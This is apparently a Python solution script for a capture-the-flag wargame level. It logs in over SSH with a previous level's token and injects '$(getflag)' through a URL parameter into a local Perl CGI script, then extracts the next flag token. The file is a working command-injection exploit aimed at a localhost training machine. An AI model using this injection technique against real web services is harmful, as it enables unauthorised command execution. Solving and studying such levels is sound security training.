"""Level04 - Perl CGI Command Injection via SSH"""

import subprocess
import sys
import re


def ssh_cmd(host, port, user, pwd, cmd):
    """Execute SSH command."""
    try:
        result = subprocess.run(
            [
                "sshpass",
                "-p",
                pwd,
                "ssh",
                "-o",
                "StrictHostKeyChecking=no",
                "-p",
                str(port),
                f"{user}@{host}",
                cmd,
            ],
            capture_output=True,
            text=True,
            timeout=10,
        )
        return result.returncode, result.stdout, result.stderr
    except:
        return -1, "", ""


def exploit(host, port, ssh_port, pwd):
    """Execute command injection attack on CGI script."""
    print(f"[*] Connecting to level04@{host}:{ssh_port}")
    code, out, err = ssh_cmd(host, ssh_port, "level04", pwd, "id")
    if code != 0:
        print("[!] SSH connection failed")
        return False, ""
    print(f"[+] SSH OK: {out.strip()}\n")

    cmd = 'curl -s "http://localhost:4747/?x=\\$(getflag)"'
    print(f"[*] Executing: {cmd}")
    code, out, err = ssh_cmd(host, ssh_port, "level04", pwd, cmd)

    if code == 0:
        match = re.search(r"token\s*:\s*([a-zA-Z0-9]+)", out)
        if match:
            token = match.group(1)
            print(f"[+] Success!\n    Token: {token}")
            return True, token

    print(f"[!] Failed. Code: {code}")
    return False, ""


def main():
    print("Level04 Perl CGI Command Injection Exploit\n")

    print("[*] Reading level03 token from file...")
    try:
        with open("level03/flag", "r") as f:
            pwd = f.read().strip()
        print(f"[+] Level03 token: {pwd}\n")
    except:
        print("[!] Could not read level03 token")
        sys.exit(1)

    success, token = exploit("localhost", 4747, 4242, pwd)

    if success:
        print("\n[SUMMARY]")
        print(f"  Vulnerability: Command injection in Perl backticks")
        print(f"  Attack: Injected $(getflag) in URL parameter")
        print(f"  Result: Executed with flag04 privileges\n")
        print(f"[ANSWER]")
        print(f"  Level04 Token: {token}")
    else:
        print("[!] Exploit failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
